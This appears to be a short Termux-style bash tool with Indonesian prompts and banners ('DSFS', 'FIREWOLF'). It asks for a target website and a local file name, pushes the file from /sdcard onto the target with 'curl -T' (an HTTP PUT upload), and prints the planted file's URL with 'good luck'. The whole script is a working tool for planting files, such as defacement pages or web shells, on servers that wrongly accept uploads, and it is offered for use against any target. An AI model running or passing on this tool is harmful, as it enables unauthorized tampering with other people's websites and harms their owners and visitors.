cowsay -f eyes 'DSFS'| lolcat
figlet -f slant "FIREWOLF" | lolcat
read -p "Masukkan web Targetmu => " target
read -p "Nama script anda => " sc;
curl -T/sdcard/$sc $target
echo "moga beruntung:v => " $target/$sc
